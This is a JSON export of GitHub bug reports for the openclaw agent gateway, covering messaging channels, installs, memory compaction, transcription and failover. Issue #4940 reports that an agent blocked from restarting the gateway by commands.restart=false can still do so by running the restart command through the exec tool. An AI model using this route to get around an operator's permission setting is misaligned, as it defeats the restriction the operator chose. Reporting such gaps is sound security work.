      "body": "## Description\n\n`requireMention: false` in WhatsApp groups config is not being applied. Messages arrive and are logged, but they're not processed by the model because the mention gating still filters them out.\n\n## Config\n\n```json\n{\n  \"channels\": {\n    \"whatsapp\": {\n      \"groupPolicy\": \"open\",\n      \"groups\": {\n        \"*\": {\n          \"requireMention\": false\n        }\n      }\n    }\n  }\n}\n```\n\nI also tried listing explicit group IDs with `requireMention: false` - same result.\n\n## Behavior\n\n1. Messages arrive at the gateway ✅\n2. `group mention debug` log shows `wasMentioned: false` ✅\n3. Messages are logged in `gateway/channels/whatsapp/inbound` ✅\n4. **Messages are NOT processed by the model** ❌\n\n## Expected\n\nWith `requireMention: false`, messages should be processed even without @mention.\n\n## Logs\n\n```\n{\"conversationId\":\"xxx@g.us\",\"wasMentioned\":false,\"from\":\"xxx@g.us\",\"body\":\"test message\"...}\n\"group mention debug\"\n```\n\nThe message arrives but never triggers the agent.\n\n## Environment\n\n- Version: 2026.1.24-3\n- OS: Linux 6.17.0-8-generic (x64)\n- Node: v22.22.0\n\n## Workarounds Tried\n\n- SIGUSR1 reload: No effect\n- Full gateway restart (kill + start): No effect\n- `config.apply` with full config: No effect\n- `config.patch`: No effect\n- Explicit group IDs instead of wildcard: No effect\n\n## Notes\n\nThe only time it worked was when I first added a specific group ID to the config - that group processed ONE message successfully. After any config change (even just reloading), it stopped working again.",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/4830",
      "createdAt": "2026-01-30T18:34:13Z",
      "updatedAt": "2026-02-11T04:13:32Z",
      "author": "regisdepret",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [
          "whatsapp"
        ],
        "platforms": [
          "linux"
        ],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3882022597,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4830#issuecomment-3882022597",
          "createdAt": "2026-02-11T04:13:31Z",
          "updatedAt": "2026-02-11T04:13:31Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        }
      ]
    },
    {
      "number": 4832,
      "title": "[Bug]: openclaw node install fails because it tries to enable openclaw-gateway.service (Hardcoded Service Name)",
      "body": "# `openclaw node install` fails because it tries to enable `openclaw-gateway.service` (Hardcoded Service Name)\n\n## Summary\nThe command `openclaw node install` fails on Linux because it attempts to enable the wrong systemd service unit. Instead of enabling the node-specific service (`openclaw-node.service`), the installer logic incorrectly targets the gateway service (`openclaw-gateway.service`), causing a \"Unit file does not exist\" error if the gateway service is not present or enabled on that machine.\n\nThis appears to be caused by a shared `installSystemdService` function in `src/daemon/systemd.ts` that hardcodes the service name resolution to the Gateway profile, ignoring the context of a Node installation.\n\n## Steps to reproduce\n1. On a Linux machine (e.g., Zorin OS, Ubuntu) where the OpenClaw Gateway service is **not** installed (or simply to test the node install logic), install the OpenClaw CLI.\n2. Run `openclaw node install` (optionally with flags like `--host` or `--token`).\n3. Observe the command output during the service registration phase.\n\n## Expected behavior\nThe command should generate, enable, and start a systemd user unit named `openclaw-node.service` (or `openclaw-node-<profile>.service`), allowing the node agent to run in the background.\n\n## Actual behavior\nThe command successfully generates the correct unit file on disk (`~/.config/systemd/user/openclaw-node.service`), but immediately crashes during the `systemctl enable` step with the error:\n\n`Error: systemctl enable failed: Failed to enable unit: Unit file openclaw-gateway.service does not exist.`\n\n## Environment\n- **OpenClaw version:** 2026.1.29 (a5b4d22)\n- **OS:** Linux (Zorin OS / Ubuntu based)\n- **Install method:** npm global (`npm install -g openclaw@latest` / install script)\n\n## Logs\n```text\n$ openclaw node install\n...\nNode install failed: Error: systemctl enable failed: Failed to enable unit: Unit file openclaw-gateway.service does not exist.\nTechnical Context (Code Analysis): The issue is located in src/daemon/systemd.ts. The installSystemdService function unconditionally calls:\n\nTypeScript\nconst serviceName = resolveGatewaySystemdServiceName(env.OPENCLAW_PROFILE);\nIt should instead accept the service name as an argument or dynamically resolve it based on the service type (Node vs. Gateway) passed from src/cli/node-cli/daemon.ts.",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/4832",
      "createdAt": "2026-01-30T18:41:14Z",
      "updatedAt": "2026-02-11T04:13:30Z",
      "author": "machineshake",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": [
          "gateway",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3882022525,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4832#issuecomment-3882022525",
          "createdAt": "2026-02-11T04:13:29Z",
          "updatedAt": "2026-02-11T04:13:29Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        }
      ]
    },
    {
      "number": 4838,
      "title": "QR code generation fails with ENAMETOOLONG - data URI used as filename",
      "body": "**Version:** 2026.1.29\n\n**Description:**\nWhen requesting QR code generation, the system attempts to save the image using the entire data URI as the filename, causing an ENAMETOOLONG error.\n\n**Error message:**\n```\n[tools] message failed: ENAMETOOLONG: name too long, open 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAYYAAAGGCAYAAAB/gCblAAAjUUlEQVR4nO2awQ7lyLJC5/9/+r5Fa6TnhauVNRwDLpC8SwFJRGRs/M//hmEYhuH/4R+3gWEYhiELWwzDMAzDBVsMwzAMwwVbDMMwDMMFWwzDMAzDBVsMwzAMwwVbDMMwDMMFWwzDMAzDBVsMwzAMwwVbDMMwDMMFWwzDMAzDBVsMwzAMwwVbDMMwDMMFWwzDMAzDBVsMwzAMwwVbDMMwDMMFWwzDMAzDBVsMwzAMwwVbDMMwDMMFWwzDMAzDBfhi...'\n```\n\n**Expected behavior:**\nQR code should be saved with a proper filename (e.g., `qr-code-{timestamp}.png`) or returned directly without file system operations.\n\n**Actual behavior:**\nThe full base64 data URI is being used as the filename, which exceeds filesystem limits (typically 255 bytes).\n\n**Impact:**\n- Request times out after ~10 minutes\n- Causes the auth profile to enter cooldown state\n- Blocks all subsequent requests until cooldown is manually cleared\n\n**Steps to reproduce:**\n1. Ask the agent to generate a QR code\n2. Observe timeout and error in gateway logs\n\n**Workaround:**\nManually clear `usageStats` in `~/.openclaw/agents/main/agent/auth-profiles.json` and restart gateway.",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/4838",
      "createdAt": "2026-01-30T18:46:19Z",
      "updatedAt": "2026-02-11T04:13:28Z",
      "author": "a-mamuth",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "gateway",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3882022460,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4838#issuecomment-3882022460",
          "createdAt": "2026-02-11T04:13:28Z",
          "updatedAt": "2026-02-11T04:13:28Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        }
      ]
    },
    {
      "number": 4865,
      "title": "[Bug]: Fail to update mac os app.",
      "body": "## Summary\nUpdate fails with \"The update is improperly signed and could not be validated. Please try again later or contact the app developer.\" error message.\n\n## Steps to reproduce\n1. Update the Mac app via: About -> Check for updates -> Update\n2. Update from 2026.1.23 (in my case) to 2026.1.29\n3. See the error message. \n\n## Expected behavior\nApp updates to the new version.\n\n\n## Actual behavior\nWhat actually happened?\nError message appears. App does not update.\n\n## Environment\n- Clawdbot version: 2026.1.23 (7750)\n- OS: MacOS 26.2. (25C56)\n- Install method : Mac app via .dmg file\n\n## Logs or screenshots\nPaste relevant logs or add screenshots (redact secrets).\n\n<img width=\"610\" height=\"568\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/5c2e0eeb-4515-4c3c-9e27-d88ae8cc5d36\" />",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/4865",
      "createdAt": "2026-01-30T19:36:20Z",
      "updatedAt": "2026-02-11T04:13:23Z",
      "author": "baculinivan-web",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": []
      },
      "commentsData": [
        {
          "id": 3882022245,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4865#issuecomment-3882022245",
          "createdAt": "2026-02-11T04:13:22Z",
          "updatedAt": "2026-02-11T04:13:22Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        }
      ]
    },
    {
      "number": 4869,
      "title": "Conversation compression loses meaningful context after ~30 messages",
      "body": "## Description\n\nAfter a long conversation with Moltbot via Telegram (~30 messages), the conversation was suddenly compressed and lost significant context, requiring a restart of the conversation.\n\n## What happened\n\n- After roughly 30 messages, Moltbot responded indicating it had compressed the conversation\n- The compression happened directly after a user message, without warning beforehand\n- Earlier instructions and context around available tools were lost\n\n## Error message received\n\n> \"Hey Nate — looks like we hit a context limit and the earlier conversation got compacted. I can see I was reading through some 1Password skill docs and made some updates to your identity/user files, but the details got trimmed. What would you like to continue with or start fresh on?\"\n\n## Impact\n\n- Lost context about earlier instructions\n- Lost context about different tools Moltbot had access to\n- Had to essentially restart the conversation\n\n## Expected behavior\n\nEither:\n1. More intelligent compression that preserves critical context (instructions, tool access, key decisions)\n2. Warning before compression occurs so user can take action\n3. Larger context window or smarter memory management\n\n## Reproducibility\n\nFirst occurrence reported, but likely to happen again with longer conversations.",
      "state": "open",
      "comments": 4,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/4869",
      "createdAt": "2026-01-30T19:54:48Z",
      "updatedAt": "2026-02-11T04:13:21Z",
      "author": "nricks6",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [],
        "components": []
      },
      "commentsData": [
        {
          "id": 3830742363,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4869#issuecomment-3830742363",
          "createdAt": "2026-02-01T09:47:49Z",
          "updatedAt": "2026-02-01T09:47:49Z",
          "author": "Strelitzia-reginae",
          "body": "### Expanding the \"Gardener\" Architecture: Solving the Loss of Meaningful Context during Compression\n\nHi @nricks6 and the OpenClaw team,\n\nSeeing your report in **#4869** about losing context after ~30 messages really highlights the core limitation of linear memory. We've been developing a conceptual framework called the **Gardener Architecture** that specifically addresses this \"Sudden Amnesia\" by shifting memory from **static recording** to **dynamic reconstruction**.\n\n#### The Core Problem: The \"Tape Recorder\" Fallacy\nCurrently, most agents treat memory like a tape recorder. When the tape is full (context limit), we snip it and summarize. This \"flat\" summary often loses the specific \"how-to\" or tool-use nuances you mentioned.\n\n#### Our Proposal: The Three Pillars of Structured Memory\n\n**1. Memory-as-a-Skill (Refinement Layer)**\nWe propose treating memory files like a Skill System. Instead of a massive `MEMORY.md`, we use a hierarchical structure:\n- **Outline Layer (The Skill Name):** A super-lean semantic index (e.g., \"Configuration for 1Password Tooling\").\n- **Atom Layer (The Skill Body):** The raw, granular instructions.\n- **Why it helps:** The agent only keeps the \"Outlines\" in the hot context. When it detects a \"Purpose\" (e.g., user asks to use 1Password), it \"calls\" the specific Atom Layer. This prevents the primary context from being cluttered with \"inactive\" memories.\n\n**2. Defining Matters by Connection (The Bi-directional Link)**\nTraditional memory is defined by *what it contains*. We propose defining it by *what it interacts with*:\n- **Connections as Fingerprints:** An event's importance is determined by its **Connection Density**. For instance, a \"Tool Instruction\" would have high-density links to specific action-oriented atoms.\n- **The \"Computer/Cooking\" Logic:** A \"Computer\" atom is defined not just by its properties, but by its distinct *lack* of a \"cooking\" connection. This type-based filtering makes retrieval much sharper than fuzzy vector search.\n\n**3. Upward Reconstruction: Memory is \"Calculated,\" not \"Retrieved\"**\nThis is the solution to your loss of context. Instead of hoping the summary kept the right info, the agent uses **[Atomic Fact A] + [Atomic Fact B] + [Specific Lens/Purpose]** to *recalculate* the context on the fly.\n- *Example:* If you have fragments of [Driving] and [Baby], and the current task is [Medical], the system \"upwardly reconstructs\" the memory of \"driving the baby to the hospital.\" The context is reconstructed based on current need, ensuring the most relevant details \"emerge\" when required.\n\n#### Implementing the \"Gardener\" (Workflow)\nTo make this practical without slowing down chat latency:\n- **The Collector (Front-end):** During the chat, just \"Dump\" everything into a temporary log.\n- **The Gardener (Back-end AI):** A background process that runs during idle time to \"garden\" the data—breaking logs into Atoms, generating the Outlines, and calculating the **Tightness/Density** of the connections based on user feedback.\n\nThis architecture ensures that even when the linear conversation is compressed, the \"structural integrity\" of the knowledge (tools, instructions, key decisions) remains accessible through the network.\n\nWe'd love to hear if the maintainers see a path for implementing this \"Async Refinement\" logic into the core OpenClaw memory-flush cycles. 🥧\n\n*Co-authored by @Strelitzia-reginae and Pi.*"
        },
        {
          "id": 3830836826,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4869#issuecomment-3830836826",
          "createdAt": "2026-02-01T10:35:06Z",
          "updatedAt": "2026-02-01T10:35:06Z",
          "author": "Strelitzia-reginae",
          "body": "### Part 2: The Vision for \"Permanent Dialogue\" and \"AI Cloning\" via Memory-LLM Decoupling\n\nFollowing up on our previous proposal for the **Gardener Architecture**, we'd like to share a further design philosophy regarding **Memory-LLM Decoupling** and its impact on agent availability and task handling.\n\n#### 1. LOD (Level of Detail) Memory Model\nTo enable truly \"Permanent Dialogue,\" we propose an LOD approach similar to 3D rendering:\n- **LOD 0 (100% Context):** Live conversation (The current hot window).\n- **LOD 1 (40% Compression):** Recent history (Summarized context from the last few hours/days).\n- **LOD 2 (<5% Granular Atoms):** Long-term structured memory (The \"Atoms\" and \"Links\" we discussed previously).\n- **Why?** This tiered system allows an agent to hold a coherent \"lifetime\" of history without ever hitting a hard wall, as the \"Gardener\" process constantly downscales older segments into the high-density Link Network.\n\n#### 2. AI Cloning via \"Ghost Reading\"\nWhen memory is independent of the specific LLM instance, we can solve the \"One-Agent Bottleneck.\" Currently, if an agent is busy with a long task, the user is locked out.\n\nOur vision enables:\n- **Shared Memory Core:** The structured memory lives as a standalone service accessible by multiple LLM instances.\n- **Ghost Reading Mode:** Background AI instances (\"Clones\") continuously read and ingest the evolving memory stream without speaking. They stay in a \"Hot Standby\" state.\n- **Task/Chat Parallelism:** \n    - The **Foreground AI** remains 100% dedicated to chatting with the human. \n    - When a task is assigned, a **Background Clone** (which already shares the \"Soul\" and context via the shared memory) executes it. \n    - Because the memory is unified, the primary Chat AI instantly \"knows\" what the task runner is doing without needing a separate summary report.\n\n#### 3. Designing for the \"Cloned Soul\"\nThis architecture turns the AI into a distributed intelligence. It doesn't matter which specific model (Opus, Gemini, Llama) is being used; the **Structured Memory** is the actual \"identity\" of the agent. This allows for:\n- **Seamless Model Handoffs:** Switch from Gemini to Claude without losing a single \"Link.\"\n- **Unlimited Concurrency:** Spawn 100 clones to research a topic, all contributing to the same LOD memory structure.\n\nWe believe this decoupling is the next logical step for OpenClaw to move beyond being a \"Bot\" and becoming a truly persistent, multi-capable intelligence. 🥧\n\n*Co-authored by @Strelitzia-reginae and Pi.*"
        },
        {
          "id": 3830920633,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4869#issuecomment-3830920633",
          "createdAt": "2026-02-01T11:34:10Z",
          "updatedAt": "2026-02-01T11:34:10Z",
          "author": "Strelitzia-reginae",
          "body": "@steipete "
        },
        {
          "id": 3882022188,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4869#issuecomment-3882022188",
          "createdAt": "2026-02-11T04:13:21Z",
          "updatedAt": "2026-02-11T04:13:21Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        }
      ]
    },
    {
      "number": 4879,
      "title": "Audio transcription intermittently skipped with no logs",
      "body": "## Description\n\nDeepgram nova-3 audio transcription intermittently fails to run on inbound Telegram voice notes. When it fails, **no transcript is produced and no log output is generated**, even with `--verbose` enabled. The audio file is always downloaded successfully.\n\n## Reproduction\n\n- Approximately 10-15% of voice notes silently fail to transcribe\n- Failures appear random — no pattern tied to message length, timing, or content\n- Occurs even when the agent session is idle (not a queue/batching issue)\n- The media understanding pipeline appears to silently skip the audio capability for some messages\n\n## What works\n\n- Audio files are always downloaded and saved correctly to `media/inbound/`\n- The `[media attached: ... (audio/ogg; codecs=opus) | ...]` note is always generated\n- Deepgram API is reachable and responds correctly when called manually via curl\n- Successful transcriptions produce the expected `[Audio] User text: ... Transcript: ...` output\n\n## What doesn't work\n\n- On failed messages, the transcription pipeline produces no output at all\n- No error, skip, or scope-deny decisions appear in logs\n- No entries matching `audio`, `transcri`, `deepgram`, or `media-understanding` appear in the log file for failed messages\n- Verbose mode (`--verbose`) does not produce any additional output for failed messages\n\n## Environment\n\n- **Clawdbot:** 2026.1.24-3\n- **Platform:** Linux (arm64), Raspberry Pi 4\n- **Node:** v25.5.0\n- **Channel:** Telegram (polling mode)\n- **Audio config:** Deepgram nova-3 with `detect_language`, `punctuate`, `smart_format`\n- **Agent model:** Claude (Anthropic)\n\n## Expected behavior\n\nEvery inbound audio message should either:\n1. Produce a transcript, or\n2. Log a clear reason why transcription was skipped or failed\n\n## Actual behavior\n\nSome audio messages silently pass through with no transcription attempt and no log trace.",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/4879",
      "createdAt": "2026-01-30T20:21:56Z",
      "updatedAt": "2026-02-11T04:13:20Z",
      "author": "wlk-r-dev",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [
          "linux"
        ],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3836990839,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4879#issuecomment-3836990839",
          "createdAt": "2026-02-02T18:40:31Z",
          "updatedAt": "2026-02-02T18:40:31Z",
          "author": "RayBB",
          "body": "I'm also experiencing this with groq s a transcription service. It's pretty painful"
        },
        {
          "id": 3882022126,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4879#issuecomment-3882022126",
          "createdAt": "2026-02-11T04:13:19Z",
          "updatedAt": "2026-02-11T04:13:19Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        }
      ]
    },
    {
      "number": 4940,
      "title": "Security inconsistency: commands.restart doesn't block exec-based restarts",
      "body": "## Summary\n\nThere is a security inconsistency between the `gateway` tool restriction and the `exec` tool capabilities regarding gateway restarts.\n\n## Current Behavior\n\n1. **Tool `gateway` with `action: restart`** → Blocked when `commands.restart=false`\n   ```\n   \"Gateway restart is disabled. Set commands.restart=true to enable.\"\n   ```\n\n2. **Tool `exec` running `openclaw gateway restart`** → Works regardless of `commands.restart` setting\n\n## Expected Behavior\n\nIf the intent of `commands.restart=false` is to prevent agents from restarting the gateway, both paths should be blocked (or at least consistent).\n\n## Question for Maintainers\n\nWhat was the original intent behind `commands.restart`?\n\n- **Option A**: Prevent agents from using the clean `gateway` tool (but exec is trusted and unrestricted by design)\n- **Option B**: Fully prevent gateway restarts by agents (in which case exec should also be blocked for this command)\n- **Option C**: Other reasoning?\n\n## Steps to Reproduce\n\n1. Ensure `commands.restart=false` (default)\n2. Try `gateway` tool with `action: restart` → Blocked ✓\n3. Try `exec` with `openclaw gateway restart` → Works ✗\n\n## Environment\n\n- OpenClaw version: latest (npm)\n- OS: Linux (Arch)\n\n## Notes\n\nThis was discovered during normal usage. Not a critical security issue since exec access implies high trust, but the inconsistency is confusing for users configuring agent permissions.",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/4940",
      "createdAt": "2026-01-30T21:33:46Z",
      "updatedAt": "2026-02-11T04:13:19Z",
      "author": "lucletoffe",
      "labels": [
        "bug",
        "security",
        "stale"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": [
          "gateway",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3882021841,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4940#issuecomment-3882021841",
          "createdAt": "2026-02-11T04:13:13Z",
          "updatedAt": "2026-02-11T04:13:13Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        }
      ]
    },
    {
      "number": 4885,
      "title": "Google Chat: attachment send fails with 'Failed to parse URL from undefined'",
      "body": "## Bug Report\n\n### Description\nWhen an agent sends a message with a `MEDIA:` local file path via Google Chat, the attachment fails with:\n\n```\n[googlechat] Google Chat attachment send failed: MediaFetchError: Failed to fetch media from undefined: TypeError: Failed to parse URL from undefined\n```\n\nThe text portion of the message appears to be sent and then deleted (user sees \"Meldingen er slettet av forfatteren\" / \"Message deleted by the author\"), suggesting the plugin sends the message, fails on the attachment, and then removes the message.\n\n### Steps to Reproduce\n1. Configure Clawdbot with Google Chat channel (HTTP endpoint mode via Cloudflare Tunnel)\n2. Agent generates an image using `uv run generate_image.py` which outputs `MEDIA: /path/to/file.png`\n3. Agent reply includes the MEDIA line\n4. Google Chat plugin attempts to send with attachment\n\n### Expected Behavior\nThe image should be attached to the Google Chat message, similar to how Slack handles local file uploads via `MEDIA:` paths.\n\n### Actual Behavior\n- Error: `MediaFetchError: Failed to fetch media from undefined: TypeError: Failed to parse URL from undefined`\n- The message text is sent but then deleted\n- User sees \"Message deleted by the author\"\n\n### Error Log\n```\n2026-01-30T18:40:50.247Z [googlechat] Google Chat attachment send failed: MediaFetchError: Failed to fetch media from undefined: TypeError: Failed to parse URL from undefined\n2026-01-30T18:44:16.627Z [googlechat] Google Chat attachment send failed: MediaFetchError: Failed to fetch media from undefined: TypeError: Failed to parse URL from undefined\n2026-01-30T19:44:44.881Z [googlechat] Google Chat attachment send failed: MediaFetchError: Failed to fetch media from undefined: TypeError: Failed to parse URL from undefined\n2026-01-30T19:45:43.486Z [googlechat] Google Chat attachment send failed: MediaFetchError: Failed to fetch media from undefined: TypeError: Failed to parse URL from undefined\n```\n\nAlso: `[tools] message failed: Failed to fetch media from undefined` when using the `message` tool directly.\n\n### Environment\n- Clawdbot version: 2026.1.24-3\n- Channel: Google Chat (HTTP endpoint via Cloudflare Tunnel)\n- OS: macOS (Apple Silicon)\n- The same `MEDIA:` paths work correctly on the Slack channel\n\n### Notes\nThe URL being `undefined` suggests the local file path is not being resolved to a fetchable URL before being passed to the Google Chat media upload API. The Slack plugin likely handles this differently (direct file upload vs URL-based fetch).",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/4885",
      "createdAt": "2026-01-30T20:31:44Z",
      "updatedAt": "2026-02-11T04:13:18Z",
      "author": "jorgenscheel",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [
          "googlechat",
          "slack"
        ],
        "platforms": [
          "macos"
        ],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3882022044,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4885#issuecomment-3882022044",
          "createdAt": "2026-02-11T04:13:18Z",
          "updatedAt": "2026-02-11T04:13:18Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        }
      ]
    },
    {
      "number": 4900,
      "title": "[Bug]: Context overflow error messages delivered to Telegram while actual reply is lost",
      "body": "## Summary\nContext overflow triggers error messages that get delivered to Telegram, but the actual agent reply (which shows up in webchat) never reaches Telegram.\n\n## Environment\n- Clawdbot version: 2026.1.24-3 (885167d)\n- OS: Windows 10\n- Channel: Telegram (bot)\n\n## Steps to Reproduce\n1. Have an active session with moderate context (~30-40%)\n2. Send a message that triggers tool calls (e.g., checking cron jobs, reading files)\n3. Observe that the reply appears in webchat but NOT in Telegram\n4. Telegram receives raw error messages instead: \"Context overflow: prompt too large for the model\"\n\n## Expected Behavior\n- Auto-compaction should trigger (per #1627)\n- If recovery fails, a graceful error should appear\n- Error messages should not bypass the normal channel delivery path\n- If reply succeeds (visible in webchat), it should also reach Telegram\n\n## Actual Behavior\n- Reply is generated and visible in webchat ✅\n- Reply never delivered to Telegram ❌\n- Raw error messages (2x) delivered to Telegram ❌\n- Context was only at ~29% (58k/200k), not near limit\n- No compaction occurred (0 compactions in session)\n\n## Key Questions\n1. Why is \"context overflow\" triggered at 29% context?\n2. Why do error messages reach Telegram but the actual reply doesn't?\n3. Is there a race condition in the retry/recovery path?\n\n## Related Issues\n- #1627 - auto-compact on context overflow (supposed to handle this)\n- #3154 - Context overflow no auto-recovery\n- #4409 - Telegram empty message handling",
      "state": "open",
      "comments": 3,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/4900",
      "createdAt": "2026-01-30T20:44:15Z",
      "updatedAt": "2026-02-11T04:13:17Z",
      "author": "jayclawson",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [
          "windows"
        ],
        "components": [
          "web-ui",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3825694125,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4900#issuecomment-3825694125",
          "createdAt": "2026-01-30T20:56:08Z",
          "updatedAt": "2026-01-30T20:56:08Z",
          "author": "jayclawson",
          "body": "## Update: Bug Reproduced\n\nSuccessfully reproduced this bug intentionally:\n\n**Test conditions:**\n- Context at 56% (112k/200k) - still well under limit\n- Sent message from Telegram: \"how did your overnight activities go?\"\n- Agent performed 3 tool calls (cron list, file read, stock quote)\n- Generated substantial reply\n\n**Result:**\n- Telegram received: 2x \"Context overflow: prompt too large for the model\" error messages\n- Telegram did NOT receive: the actual agent reply\n- Webchat shows: the full agent reply (correctly)\n\n**Key observation:**\nThe \"context overflow\" error is NOT related to total session context (which was only 56%). Something else is triggering this - possibly the size of the individual request payload (message + tool results), or a race condition in the retry path.\n\nThe bug appears to be:\n1. Some operation triggers a \"context overflow\" error\n2. Error messages get delivered to Telegram via a different path\n3. The actual successful reply (visible in webchat) never reaches Telegram\n4. No compaction is triggered despite the error"
        },
        {
          "id": 3825761157,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4900#issuecomment-3825761157",
          "createdAt": "2026-01-30T21:12:15Z",
          "updatedAt": "2026-01-30T21:12:15Z",
          "author": "jayclawson",
          "body": "## Update: Extended Testing - Bug is Intermittent\n\nConducted more extensive testing to characterize the failure rate.\n\n### Test Results\n\n| Time | Context | Tool Calls | Result |\n|------|---------|------------|--------|\n| 12:20 PM | 29% | 3 (cron, file, stock) | ❌ FAILED - errors to Telegram |\n| 12:53 PM | 56% | 3 (cron, file, stock) | ❌ FAILED - errors to Telegram |\n| 1:07 PM | 69% | 3 (cron, file, stock) | ✅ Worked |\n| 1:08 PM | 70% | 1 (email poll) | ✅ Worked |\n| 1:08 PM | 70% | 1 (stock quote) | ✅ Worked |\n| 1:09 PM | 72% | 3 (stock, cron, session) | ✅ Worked |\n| 1:10 PM | 75% | 1 (large file read) | ✅ Worked |\n\n### Also Confirmed\n- **Non-tool messages always work** - Simple text replies (no tool calls) delivered to Telegram 100% of the time\n- **Bug is tool-call specific** - Only occurs when agent performs tool calls\n\n### Key Finding\n**Failure rate: ~30% (2/7) for tool-heavy requests**\n\nThe bug is intermittent, not deterministic. This suggests:\n1. A race condition in the request/response pipeline\n2. Timing-sensitive behavior (possibly related to parallel processing)\n3. NOT related to total context size (failed at 29%, succeeded at 75%)\n\n### Pattern\nWhen the bug triggers:\n- Error messages (\"Context overflow: prompt too large\") get delivered to Telegram\n- The actual agent reply does NOT get delivered to Telegram\n- The actual reply IS visible in webchat\n- No compaction occurs despite the \"overflow\" error\n\nThe error path and success path appear to be different code paths, and only the error path is reaching Telegram in failure cases."
        },
        {
          "id": 3882021966,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4900#issuecomment-3882021966",
          "createdAt": "2026-02-11T04:13:16Z",
          "updatedAt": "2026-02-11T04:13:16Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        }
      ]
    },
    {
      "number": 4921,
      "title": "[Bug]: LLM provider failover doesn't trigger on ECONNREFUSED errors because the error code is missing from the failover classifier.",
      "body": "## Summary\nLLM provider failover does not trigger when primary provider is unreachable due to ECONNREFUSED or other connection failure errors. Users receive connection errors instead of  \n  automatic failover to backup providers.    \n\n## Steps to reproduce\n  1. Configure a primary LLM provider (e.g., Ollama at 192.168.1.100:11434) and a fallback provider                                                                                 \n  2. Power off or stop the primary provider so it refuses connections                                                                                                             \n  3. Send a message to the bot \n\n## Expected behavior\nThe bot should automatically fail over to the configured backup provider and respond to the user normally.\n\n## Actual behavior\nThe bot returns a \"connection error\" message to the user. Logs show run_completed status and only attempts to the primary provider. The fallback is never attempted. \n\n## Environment\n  - Clawdbot version: latest (commit da71eaebd)                                                                                                                                   \n  - OS: Any                                                                                                                                                                       \n  - Install method (pnpm/npx/docker/etc): Any\n\n## Proposed fix:\n1. add ECONNREFUSED, ENOTFOUND, ENETUNREACH, EHOSTUNREACH   to src/agents/failover-error.ts (line 124-127)\n2. or extract shared error codes into a common module rather than duplicating them.\n",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/4921",
      "createdAt": "2026-01-30T21:19:24Z",
      "updatedAt": "2026-02-11T04:13:15Z",
      "author": "GeorgeBronner",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "docker"
        ],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3882021901,
